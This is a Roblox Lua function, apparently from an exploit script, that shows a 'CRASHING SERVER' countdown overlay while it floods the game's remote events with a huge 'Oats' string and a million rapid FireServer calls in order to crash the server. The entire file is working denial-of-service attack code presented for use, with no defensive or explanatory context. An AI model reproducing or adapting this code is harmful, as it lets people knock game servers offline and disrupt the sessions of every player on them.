local function triggerServerShutdown()
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "ShutdownTimerGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = CoreGui

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 320, 0, 100)
	frame.Position = UDim2.new(0.5, -160, 0.2, 0)
	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	frame.BorderSizePixel = 0
	frame.Parent = screenGui

	local uiCorner = Instance.new("UICorner")
	uiCorner.CornerRadius = UDim.new(0, 8)
	uiCorner.Parent = frame

	local textLabel = Instance.new("TextLabel")
	textLabel.Size = UDim2.new(1, 0, 1, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
	textLabel.TextSize = 20
	textLabel.Font = Enum.Font.GothamBold
	textLabel.Text = "SHUTDOWN CRASHING... (15s)"
	textLabel.Parent = frame

	task.spawn(function()
		pcall(function()
			local dataEvents = ReplicatedStorage:WaitForChild("DataEvents", 10)
			if dataEvents then
				local texEvent = dataEvents:FindFirstChild("UpdateTexturesChoice")
				if texEvent then
					texEvent:FireServer(("Oats"):rep(1e6))
				end
				task.wait()
				local dataRemote = dataEvents:FindFirstChild("DataRemoteEvent")
				if dataRemote then
					dataRemote:FireServer("a")
					for _ = 1, 1e6 do
						dataRemote:FireServer()
					end
				end
			end
		end)
	end)

	task.spawn(function()
		for i = 15, 1, -1 do
			textLabel.Text = "CRASHING SERVER... (" .. tostring(i) .. "s)"
			task.wait(1)
		end
		textLabel.Text = "CRASH SEQUENCE COMPLETE"
		textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
		task.wait(2)
		screenGui:Destroy()
	end)
end

